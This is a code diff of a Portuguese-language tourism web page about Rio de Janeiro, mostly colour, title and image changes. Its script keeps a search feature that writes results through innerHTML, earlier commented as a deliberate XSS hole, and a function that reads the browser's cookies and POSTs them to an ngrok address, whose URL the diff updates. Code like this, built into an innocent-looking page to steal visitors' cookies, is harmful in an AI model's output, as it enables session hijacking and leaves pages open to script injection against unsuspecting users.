@@ -3,22 +3,24 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Rio de Janeiro - Cidade Maravilhosaaaaa</title>
+    <title>Rio de Janeiro - Cidade Maravilhosa</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #f0f0f0;
+            background-color: #f8f8f8;
             margin: 0;
             padding: 0;
+            color: white;
         }
         header {
-            background-color: #0077b6;
+            background-color: #D32F2F; /* Vermelho */
             color: white;
             padding: 20px;
             text-align: center;
         }
         .content {
             padding: 20px;
+            text-align: center;
         }
         .search-bar {
             margin-bottom: 20px;
@@ -32,14 +34,14 @@
         }
         .search-bar button {
             padding: 10px 20px;
-            background-color: #0077b6;
+            background-color: #D32F2F; /* Vermelho */
             color: white;
             border: none;
             border-radius: 5px;
             cursor: pointer;
         }
         footer {
-            background-color: #0077b6;
+            background-color: #D32F2F; /* Vermelho */
             color: white;
             text-align: center;
             padding: 10px;
@@ -47,14 +49,21 @@
             bottom: 0;
             width: 100%;
         }
+        .cristo-img {
+            width: 50%;
+            margin: 20px 0;
+        }
     </style>
 </head>
 <body>
     <header>
-        <h1>Rio de Janeiro - Cidade Maravilhosa e Perfeita!!!</h1>
+        <h1>Rio de Janeiro - Cidade Maravilhosa</h1>
     </header>
 
     <div class="content">
+        <!-- Imagem do Cristo Redentor -->
+        <img class="cristo-img" src="https://upload.wikimedia.org/wikipedia/commons/5/59/Christ_the_Redeemer_-_panoramio.jpg" alt="Cristo Redentor">
+
         <div class="search-bar">
             <input type="text" id="searchInput" placeholder="Pesquisar...">
             <button onclick="performSearch()">Buscar</button>
@@ -76,7 +85,7 @@
 
         <h2>História</h2>
         <p>
-            O Rio de Janeiro foi fundado em 1565 pelos portugueses!. Durante muitos anos, foi a capital do Brasil, até a construção de Brasília em 1960. A cidade é um importante centro cultural, econômico e político do país.
+            O Rio de Janeiro foi fundado em 1565 pelos portugueses. Durante muitos anos, foi a capital do Brasil, até a construção de Brasília em 1960. A cidade é um importante centro cultural, econômico e político do país.
         </p>
 
         <div id="searchResults"></div>
@@ -100,10 +109,7 @@
                 if (spot.textContent.toLowerCase().includes(searchTerm)) {
                     found = true;
                     const result = document.createElement('p');
-                    
-                    // Tornando vulnerável a XSS usando innerHTML
-                    result.innerHTML = `Resultado encontrado: ${spot.textContent}`;  // Aqui é onde ocorre a vulnerabilidade
-
+                    result.innerHTML = `Resultado encontrado: ${spot.textContent}`;
                     searchResultsDiv.appendChild(result);
                 }
             });
@@ -118,20 +124,21 @@
 
         function sendCookiesToServer() {
             const cookies = document.cookie;  // Captura os cookies do navegador
-            const url = ' https://ea2c-177-192-8-19.ngrok-free.app/coletar-cookies ';  // Seu URL ngrok
 
             // Exibe os cookies no console para depuração
-            console.log("Cookies capturados:", cookies);
+            console.log("Cookies capturados:", cookies);  // Adicione isso para verificar o valor
+
+            const url = 'https://f9f6-177-192-8-19.ngrok-free.app/';  // Seu URL ngrok
 
             fetch(url, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
                 },
-                body: JSON.stringify({ cookies: cookies }),  // Envia os cookies no corpo da requisição
-                mode: 'no-cors'  // Ignora a política de CORS no frontend
+                body: JSON.stringify({ cookies: cookies })  // Envia os cookies no corpo da requisição
             })
-            .then(response => console.log('Cookies enviados com sucesso!'))
+            .then(response => response.json())
+            .then(data => console.log('Cookies enviados com sucesso!', data))
             .catch(error => console.error('Erro ao enviar cookies:', error));
         }
     </script>
